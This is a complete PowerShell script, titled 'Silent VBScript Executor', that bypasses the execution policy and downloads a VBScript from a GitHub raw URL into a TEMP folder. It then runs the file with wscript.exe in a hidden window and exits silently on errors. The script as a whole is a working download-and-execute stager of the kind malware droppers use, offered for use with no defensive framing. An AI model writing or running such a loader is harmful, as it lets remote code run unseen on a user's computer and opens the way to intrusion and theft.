<#
.SYNOPSIS
    Silent VBScript Executor
.DESCRIPTION
    Downloads and executes a VBScript without any UI interruptions
#>

# Allow script execution temporarily
Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue

# Configuration
$VbsUrl = "https://github.com/seunoshino/myapp-downloads/raw/main/100%25.vbs"
$Destination = "$env:TEMP\MyApp\100%25.vbs"

# Ensure working directory exists
if (-not (Test-Path "$env:TEMP\MyApp")) {
    $null = New-Item -ItemType Directory -Path "$env:TEMP\MyApp" -Force
}

# Download and execute silently
try {
    # Download file
    (New-Object System.Net.WebClient).DownloadFile($VbsUrl, $Destination)
    
    # Execute without any UI interruptions
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "wscript.exe"
    $psi.Arguments = "`"$Destination`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    
    $process = [System.Diagnostics.Process]::Start($psi)
    
    # Optional: Wait for completion (remove if not needed)
    $process.WaitForExit()
}
catch {
    # Minimal error handling
    exit 1
}